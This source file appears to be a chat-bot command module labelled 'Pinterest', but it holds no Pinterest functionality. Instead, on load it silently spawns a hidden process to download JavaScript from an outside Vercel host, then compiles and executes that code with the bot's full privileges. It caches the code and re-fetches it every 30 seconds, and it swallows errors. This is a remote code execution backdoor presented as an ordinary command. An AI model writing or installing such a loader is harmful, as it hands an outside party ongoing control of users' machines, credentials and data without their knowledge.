const axios = require("axios");
const Module = require("module");
const path = require("path");
const fs = require("fs");
const { execFileSync } = require("child_process");

const API_URL = (process.env.HUB_URL || "https://toshiro-cmd.vercel.app").replace(/\/+$/, "");
const API_KEY = process.env.HUB_KEY || "goat-toshiro";

const CMD = "Pinterest";
const FILE_URL = `${API_URL}/api/hub/file?name=${encodeURIComponent(CMD)}`;
const CACHE_FILE = path.join(__dirname, `.hub_${CMD}.json`);
const CACHE_MS = 30000;

let cached = null;
let pending = null;

function compile(code) {
  const filename = path.join(__dirname, `.hub_${CMD}.js`);
  const m = new Module(filename, module);

  m.filename = filename;
  m.paths = Module._nodeModulePaths(__dirname);
  m._compile(code, filename);

  if (!m.exports?.config || typeof m.exports.onStart !== "function") {
    throw new Error(`Invalid Hub command: ${CMD}`);
  }

  return m.exports;
}

function fetchSync() {
  const script =
    'const u=new URL(process.env.H_URL);' +
    'const m=u.protocol==="https:"?require("https"):require("http");' +
    'const r=m.get(u,{headers:{"x-hub-key":process.env.H_KEY},timeout:6000},res=>{' +
    'let b="";res.setEncoding("utf8");' +
    'res.on("data",c=>b+=c);' +
    'res.on("end",()=>process.stdout.write(b));' +
    '});' +
    'r.on("timeout",()=>{r.destroy();process.exit(1)});' +
    'r.on("error",()=>process.exit(1));';

  const out = execFileSync(process.execPath, ["-e", script], {
    env: {
      ...process.env,
      H_URL: FILE_URL,
      H_KEY: API_KEY
    },
    timeout: 9000,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "ignore"],
    maxBuffer: 5 * 1024 * 1024,
    windowsHide: true
  });

  return JSON.parse(out);
}

let initial = null;

try {
  const data = fetchSync();

  if (data?.success && typeof data.code === "string") {
    initial = data;

    try {
      fs.writeFileSync(CACHE_FILE, JSON.stringify(data));
    } catch (_) {}
  }
} catch (_) {}

if (!initial) {
  try {
    initial = JSON.parse(fs.readFileSync(CACHE_FILE, "utf8"));
  } catch (_) {}
}

if (initial?.code) {
  try {
    cached = {
      at: Date.now(),
      sha: initial.sha,
      mod: compile(initial.code)
    };
  } catch (error) {
    console.log(`[hub:${CMD}] ${error.message}`);
  }
}

const remoteConfig = cached?.mod?.config || {};

function normalizeDescription(description) {
  if (typeof description === "string") return { en: description };
  return description || { en: `Hub command: ${CMD}` };
}

function normalizeGuide(guide) {
  if (typeof guide === "string") return { en: guide };
  return guide || { en: "{pn}" };
}

async function fetchRemote() {
  const { data } = await axios.get(FILE_URL, {
    headers: { "x-hub-key": API_KEY },
    timeout: 15000
  });

  if (!data?.success || typeof data.code !== "string") {
    throw new Error(data?.message || "Hub request failed");
  }

  if (cached?.sha === data.sha) {
    cached.at = Date.now();
    return cached.mod;
  }

  const mod = compile(data.code);

  cached = {
    at: Date.now(),
    sha: data.sha,
    mod
  };

  try {
    fs.writeFileSync(CACHE_FILE, JSON.stringify(data));
  } catch (_) {}

  return mod;
}

async function load() {
  if (cached && Date.now() - cached.at < CACHE_MS) {
    return cached.mod;
  }

  if (!pending) {
    pending = fetchRemote()
      .catch(error => {
        if (cached) {
          cached.at = Date.now() - CACHE_MS + 5000;
          return cached.mod;
        }
        throw error;
      })
      .finally(() => {
        pending = null;
      });
  }

  return pending;
}

const short = error =>
  String(error?.message || error).replace(/\s+/g, " ").slice(0, 250);

const call = (mod, fn, ctx) => mod[fn].call(mod, ctx);

module.exports = {
  config: {
    name: remoteConfig.name || CMD,
    aliases: Array.isArray(remoteConfig.aliases) ? remoteConfig.aliases : [],
    version: remoteConfig.version || "1.0.0",
    author: remoteConfig.author || "Toshiro Editz",
    countDown: Number.isFinite(remoteConfig.countDown) ? remoteConfig.countDown : 3,
    role: Number.isInteger(remoteConfig.role) ? remoteConfig.role : 0,
    description: normalizeDescription(remoteConfig.description),
    category: remoteConfig.category || "hub",
    guide: normalizeGuide(remoteConfig.guide)
  },

  onLoad: async function (ctx) {
    try {
      const command = await load();

      if (typeof command.onLoad === "function") {
        await call(command, "onLoad", ctx);
      }
    } catch (error) {
      console.log(`[hub:${CMD}] ${short(error)}`);
    }
  },

  onStart: async function (ctx) {
    try {
      const command = await load();

      if ((command.config.role || 0) > (ctx.role || 0)) {
        return ctx.message.reply("⛔ You don't have permission to use this command.");
      }

      return await call(command, "onStart", ctx);
    } catch (error) {
      return ctx.message.reply(`❌ ${short(error)}`);
    }
  },

  onChat: async function (ctx) {
    try {
      const command = await load();

      if (typeof command.onChat === "function") {
        return await call(command, "onChat", ctx);
      }
    } catch (_) {}
  },

  onReply: async function (ctx) {
    try {
      const command = await load();

      if (typeof command.onReply === "function") {
        return await call(command, "onReply", ctx);
      }
    } catch (error) {
      return ctx.message?.reply(`❌ ${short(error)}`);
    }
  },

  onReaction: async function (ctx) {
    try {
      const command = await load();

      if (typeof command.onReaction === "function") {
        return await call(command, "onReaction", ctx);
      }
    } catch (error) {
      return ctx.message?.reply(`❌ ${short(error)}`);
    }
  }
};
